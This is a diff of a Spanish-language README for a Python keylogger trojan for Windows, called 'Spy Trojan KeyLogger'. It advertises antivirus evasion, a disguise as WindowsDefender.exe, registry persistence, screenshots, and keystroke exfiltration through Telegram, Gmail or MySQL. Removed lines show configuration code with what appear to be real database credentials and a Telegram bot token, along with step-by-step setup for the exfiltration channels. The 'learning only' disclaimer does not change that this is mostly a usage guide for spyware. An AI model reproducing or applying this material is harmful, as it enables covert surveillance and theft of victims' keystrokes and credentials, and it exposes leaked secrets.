@@ -1,77 +1,86 @@
 ````
 █▀ █▀█ █▄█   ▀█▀ █▀█ █▀█   █ ▄▀█ █▄ █   █▄▀ █▀▀ █▄█ █   █▀█ █▀▀ █▀▀ █▀▀ █▀█
-▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v5.3.1    
+▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v6.0  
 ````
 
 ---
-# __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general, el aprendizaje de ___"Seguridad en sistemas informáticos"___, el creador no se hace responsable por un posible mal uso de ésta herramienta. 
+# __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general, el aprendizaje de ___"Seguridad en sistemas informáticos"___, el creador no se hace responsable por un posible mal uso de ésta herramienta.
+---
+
+
 
 ## Información
 * __Nombre:__ `Spy Trojan KeyLogger`
-* __Documentación:__ `09/07/2020` 
-* __Versión:__ `5.3.1`
+* __Documentación:__ `11/12/20` 
+* __Versión:__ `6.0`
 * __Estado:__` Estable`
 * __Plataforma:__` Windows 7, 8.1 y 10`
-* __Lenguaje:__` Python 3.8`
+* __Lenguaje:__` Python > 3.8`
 
+
+# __¡ Nota importante !:__ Ésta documentación está en proceso de escritura... algunos datos no están completas
 
 # Carpeta Principal
-![Archivos](https://i.imgur.com/F1i9X0j.png)
+![Archivos](https://imgur.com/eGfbb26.png)
+
+* __.git:__` Python > 3.8`
+* __.idea:__` Python > 3.8`
+* __Doc:__` Python > 3.8`
+* __venv:__` Python > 3.8`
+* __# Create .EXE [InfectionFile]-[Debug].bat:__` Python > 3.8`
+* __# Create .EXE [InfectionFile]-[Release].bat:__` Python > 3.8`
+* __# Create .EXE [SpyTrojan]-[Debug].bat:__` Python > 3.8`
+* __# Create .EXE [SpyTrojan]-[Release].bat:__` Python > 3.8`
+* __#=[Infection] Run.bat:__` Python > 3.8`
+* __#=[SpyTrojan] Run.bat:__` Python > 3.8`
+* __.gitignore:__` Python > 3.8`
+* __ConfigKey.ini:__` Python > 3.8`
+* __icon_infection_file.ico:__` Python > 3.8`
+* __icon_SpyTrojan.ico:__` Python > 3.8`
+* __InfectionFile.py:__` Python > 3.8`
+* __info_exe_InfectionFile.txt:__` Python > 3.8`
+* __info_exe_SpyTrojan.txt:__` Python > 3.8`
+* __InstallRequirements.bat:__` Python > 3.8`
+* __LICENSE:__` Python > 3.8`
+* __README.md:__` Python > 3.8`
+* __SpyTrojan.py:__` Python > 3.8`
 
 ---
+
+
 # Caracteristicas
-- __Indetectable Antivirus:__ Testeado en: Windows Defender `09/07/2020`, Avast, ESET NOD32
-- __Envío por DB_MYSQL:__ Envio de de datos mediante una base de datos MySQL, más información [Aquí](https://github.com/SebastianEPH/SpyTrojan_Keylogger#env%C3%ADo-mediante-base-de-datos-mysql)
 
-    ![DataBase key](https://i.imgur.com/axhHVlF.png)
-
-
-- __Envío por Gmail:__ Envía el registro de teclas por Gmail en un `reg.k`. más información [aquí](https://github.com/SebastianEPH/SpyTrojan_Keylogger#envi%C3%B3-mediante-gmail).
-
-  ![Correo ejemplo del Keylogger](https://i.imgur.com/HCyUK2M.png)
-- __Segundo Gmail en caso de Error:__ En casó el correo principal sea bloqueada o tenga x problemas, se usará un segundo correo.
-- __Recibe datos por varios correos:__ Hay una posibilidad de agregar 1 o más correos, y así el registro de teclas se envíe a varios correos a la vez.
-
-- __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
-- __Intervalo de tiempo personalizado:__ 
-    - __DATABASE:__ El tiempo recomendado es de 20 a 30 minutos.
-    - __GMAIL:__ El tiempo recomendado es de 1:30 a 2 horas mínimo. [`Google suele bloquear la cuenta por horas cuando detecta una gran cantidad de correos envíados por día.`]
-
-- __Envío del registro prueba de errores:__ En otros keylogger al momento de enviar el `reg.k`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene ninguna información de teclas oprimidas, en éste keylogger, ese error está solucionado.
 - __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por detalles de debuggeo, pero al ser compilada de `*.py` a `*.exe` el ejecutable resultante se ejecutará en segundo plano
+
+    `NOTA: imagen no actual`
 
     ![Segundo plano](https://i.imgur.com/DFAf2Tw.png)
 
 - __Disfraz:__ Al momento de ser convertido de `*.py a *.exe`. El Keylogger será disfrazado como `WindowsDefender.exe` con el ícono y la información del programa.
+
+    `NOTA: imagen no actual`
+
     ![ExeCompilado](https://i.imgur.com/TlBEAaS.png)
 
     ![Info](https://i.imgur.com/MQAiVnJ.png) 
     ![Info](https://i.imgur.com/mTBByRy.png)
 
     ![StartUP Info](https://i.imgur.com/bkGSFQC.png)
-- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `"C:\Users\Public\Security\Windows Defender\"` , y en esa carpeta encuentras el archivo `reg.k`.
+- __Oculto__ 
 
-- __Iniciar automaticamente con el sistema:__ Modifica el registro de windows, [más información aquí.](https://github.com/SebastianEPH/SpyTrojan_Keylogger#m%C3%A9todo-de-infecci%C3%B3n)
-    
+- __Iniciar automaticamente con el sistema:__ Modifica el registro de windows, 
+
+    `NOTA: imagen no actual`
+
     ![StartUp](https://i.imgur.com/xh91bR5.png)
 
-
-
-- __Envio mediante Bot Telegram:__ Soporte de envio automatico del registro de teclas a un bot especifico. Nota: puedes enviar el registro de teclas simultaneamente a 3 cuentas distintas
-- __Screenshot:__ Toma capturas de pantalla con un intervalo personalizado [Solo valido para Telegram] [hasta 3 cuentas simultaneas]
-
+- __Multiples cuentas:__ Soporte a multiples cuentas 
+- __Envio mediante Bot Telegram:__ Envia todos los datos mediante telegram
+- __Screenshot:__ Toma capturas de pantalla con un intervalo personalizado 
     ![](https://i.imgur.com/NpNzd4b.png)
 
     ![](https://i.imgur.com/r2otz8z.png)
 
-## Caracteristicas que se agregarán en futuras actualizaciones:  
-- __Soporte de envió a otros buzones de correo:__ Se insertará un soporte para poder usar Outlook, yahoo u otros servicios de correo 
-- __Conexión FTP:__ Envía el archivo `reg.k` vía FTP.
-- __Envía datos mediante FTP:__ enviará documentos, fotos y videos mediante una conexión FTP, en segundo plano.
-- __Contraseñas de Wifi:__ Obtiene contraseñas guardadas en una laptop o PC
-- __Portapapeles:__ Obtiene el texto del portapapeles.
-- __Obtiene contraseñas guardadas en Google Chrome:__ Obtiene todas las contraseñas guardadas de Google chrome .
-- __Auto Destrucción:__ El keylogger se auto destruirá en una una fecha especifica.
 
 ## Uso de Recursos de la PC
 El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
@@ -82,190 +91,19 @@ El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
 ---
 # Proceso de preparación:
 
-__NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__ y en casó de que use la conexión a la base de datos, pues MySQL básico.
+__NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__.
 
-Requerimiento de paquetes de `Python3.8`:
-
-````py
-import socket		# Verifica internet
-import threading 	# procesos multihilos
-from pynput.keyboard import Listener            # Escucha eventos del teclado
-from getpass import getuser     # Obtiene el nombre del usuario
-from datetime import datetime   # Devuelve fecha y hora actual
-from winreg import OpenKey, SetValueEx, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, HKEY_CURRENT_USER # Modifica registros de Windows
-import datetime                 # Devuelve fecha y hora actual
-import random                   # Genera numeros
-import os                       # Lib para copiar archivos
-import telepot                  # Telegram API
-import yagmail                  # Enviar archivos solo a Gmail
-import pymysql                  # Lib connection mysql
-import shutil                   # Lib para crear carpetas
-import string                   # Lib genera textos
-import time                     # Contar segundos
-from PIL import ImageGrab       # Toma capturas de pantalla
-````
-## Explicación:
-En este ejemplo solo se mostrará las constantes que deben cambiar:
-
-````py
-class Config:
-    def __init__(self):
-        self.TIME_SCREENSHOT = 30 #[seconds]                    # Tiempo de intervalo de ScreenShot
-        self.DELAY  = 1                                         # tiempo de retraso para evitar sobrecargos al iniciar
-        self.TIME_SEND = 1 #[minutos]                           # Tiempo de envió del registro
-        self.MODE_SEND = 2      # 0 = Gmail
-                                # 1 = DataBase                  # Solo se puede usar una opción
-                                # 2 = TelegramBot
-    class DataBase:  # Clase de Base de datos
-        def __init__(self):
-            self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
-            self.USERNAME = "udwlsyrbtldkznqo"                                      # Username
-            self.PASSWORD = "OR2i2dfdgWek0UDiAv4f"                                  # Password
-            self.DATABASE = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
-            self.PORT     = "3306"                                                  # Port
-    class Gmail:
-        def __init__(self):
-            self.GMAIL_1 = "correo1@gmail.com"
-            self.PASS_1  = "password1"
-            self.GMAIL_2 = "correo2@gmail.com"
-            self.PASS_2  = "password2"
-            self.GMAIL_3 = "correo3@gmail.com"
-            self.PASS_3  = "password3"
-          # Solo un correo Recibirá el Registro de Teclas
-            self.RECEIVERS = ["receivers1@yahoo.com"]
-          # Correos que recibiran el Registro de teclas, pueden ser de 1 a muchos
-            self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
-    class TelegramBot:
-        def __init__(self):
-            self.ID   = 833456944                                                     # ID Principal [Obligatorio]
-            self.ID_2 = 000000000                                                     # ID secundario [Opcional]
-            self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
-            self.TOKEN = "1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp844"             # TOKEN de tu Bot [Obligatorio]
-            # Personalize
-            self.LEN_TEXT = 3000  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
-````
-
-## ScreenShot [Solo Telegram]
-
-````py
-self.SCREENSHOT = True                                  # Activar o desactivar Screenshot
-self.TIME_SCREENSHOT = 30 #[seconds]                    # Tiempo de intervalo de ScreenShot
-self.DELAY  = 1                                         # tiempo de retraso para evitar sobrecargos al iniciar
-self.TIME_SEND = 1 #[minutos]                           # Tiempo de envió del registro
-self.MODE_SEND = 2      # 0 = Gmail
-                        # 1 = DataBase                  # Solo se puede usar una opción
-                        # 2 = TelegramBot
-````
-
-## Escoge [GMAIL], [DataBase] o [Telegram]:
-- Por ahora solo podemos escoger el envío del registro o bien por una conexión a una __Base de datos__,  __Gmail__  o __BotTelegram__ no podemos escoger dos o las tres al mismo tiempo.
-
-- Buscamos la siguiente función y escogemos [0 = Gmail], [1 = DataBase] o  [2 = BotTelegram]
-    ````py
-    # Importante
-    self.TIMESEND = 5 #[minutos]                                                # Tiempo de envió del registro
-    self.MODE = 0   # 0 = Gmail
-                    # 1 = DataBase                                            # Solo se puede usar una opción
-                    # 2 = TelegramBot
-    ```` 
+Requerimiento de paquetes de `Python > 3.8`:
 
 
-## [Configuración] Gmail
-1. Es de suma urgencia habilitar el acceso a apps menos seguras de google, la cual lo puedes hacer desde éste [link](https://myaccount.google.com/lesssecureapps).  `En caso no lo habilites, el keylogger no podrá iniciar sesión en su Gmail`
-
-2. Abra el archivo `WindowsDefender.py` en su editor de texto.
-
-    ````py
-    class Gmail:
-        def __init__(self):
-            self.GMAIL_1 = "correo1@gmail.com"
-            self.PASS_1  = "password1"
-            self.GMAIL_2 = "correo2@gmail.com"
-            self.PASS_2  = "password2"
-            self.GMAIL_3 = "correo3@gmail.com"
-            self.PASS_3  = "password3"
-          # Solo un correo Recibirá el Registro de Teclas
-            self.RECEIVERS = ["receivers1@yahoo.com"]
-          # Correos que recibiran el Registro de teclas, pueden ser de 1 a muchos
-          # self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
-    ````
-
-## [Configuración] Database MySQL
-
-1. Debes crearte una cuenta gratuita en [CleverCloud](https://www.clever-cloud.com/en/), cabe destacar que solo tenemos 10MB de almacenamiento, se recomienda, vaciar los datos cada vez que podamos, o utilizar otra base de datos.
-
-    ![Crear nueva base de datos ](https://i.imgur.com/EtkWgZe.png)
-    
-2. Select a MySQL =>
-
-    ![Select Type DataBASE](https://i.imgur.com/qyaM5Rv.png)
-
-3. Creamos una Base de Datos gratuita o pagamos por el servicio, damos a `NEXT`.
-    
-    ![Create Free and Buy](https://i.imgur.com/nFUtGnY.png)
-
-4. Escribirmos el nombre para reconocer la base de datos.
-
-    ![Name DataBase](https://i.imgur.com/7KOUQip.png)
-
-5. Obtenemos los datos de conexión.
-
-    ![Clevercloud](https://i.imgur.com/JdGTqvB.png)
-
-6. Descargamos e instalamos [HeidiSQL](https://www.heidisql.com/download.php)y creamos una nueva sesión.
-    
-    ![](https://i.imgur.com/oOAiFL2.png)
-
-7. Creamos una nueva tabla con el Nombre= `keyLog` y guardamos.
-
-    ![](https://i.imgur.com/8mcP594.png)
-
-8. Creamos los siguientes tipos de datos:
-    ````c
-    # No olvidar que el id debe ser autoincremento
-    l_id        // INT          [Llave Primaria]  [Autoincremento]
-    l_user      // CHAR         [50 Caracteres] 
-    l_time      // CHAR         [50 Caracteres]
-    l_log       // MEDIUMTEXT   [Acepta 16.777.215 Caracteres]
-                // LONGTEXT     [Acepta 4,292.967.295 Caracteres - Aprox 4GB de Texto]
-    ````
-
-    ![](https://i.imgur.com/TrGVRMB.png)
-
-9. Se debería ver así:
-
-    ![info Database](https://i.imgur.com/fc6s9qH.png)
-
-10. Ahora entramos a nuestro archivo `WindowsDefender.py` y buscamos y colocamos los datos de tu base de datos:
-
-    ````py
-        # Importante
-        self.TIMESEND = 26 #[minutos]                                                # Tiempo de envió del registro
-        self.MODE = 1     # 0 = Gmail
-                          # 1 = DataBase                                            # Solo se puede usar una opción
-                          # 2 = TelegramBot
-    class DataBase:  # Clase de Base de datos
-        def __init__(self):
-            self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
-            self.USERNAME = "udwlsyrbtldkznqo"                                      # Username
-            self.PASSWORD = "OR2i2dfdgWek0UDiAv4f"                                  # Password
-            self.DATABASE = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
-            self.PORT     = "3306"                                                  # Port
-    ````
-
-11. Si al ejecutar el keylogger todo salió bien, podemos ver en la base de datos el registro de teclas
-
-    ![Fin](https://i.imgur.com/X4MxCeA.png)
-
-    ![Fin](https://i.imgur.com/axhHVlF.png)
 
 # [Configuración] BotTelegram
 
-1. Entramos a [BotFather](https://telegram.me/BotFather) y creamos un nuevo bot.
+1. Entramos a [BotFather](https://telegram.me/BotFather).
     
     ![botFather](https://i.imgur.com/1dtdBO6.png)
 
-2. Obtenemos nuetro token 
+2. Creamos un nuevo bot y obtenemos el Token privado
     
     ![](https://i.imgur.com/oRYutuu.png)
 
@@ -363,6 +201,23 @@ __Explicación:__
 * `HKEY_CURRENT_USER:` El Keylogger solo se ejecutará en el usuario actual, si se llegará a crear otro usuario, el Keylogger Solo funcionará en el usuario principal
 <!-- Creador  -->
 ---
+
+## Lista de Cambios de la Verión 5 al 6
+````r
+[-] Se eliminó soporte de envio mediante una conexión a base de datos
+[-] Se eliminó soporte de envio mediante Gmail
+[-] 
+[-]
+[-]
+[-]
+[+]
+[+] 
+[+]
+[+]
+[+]
+
+````
+
 ## By SebastianEPH
 __Nota:__ Contacteme solo si encontró un bug o desea aportar al repositorio, gracias.
 
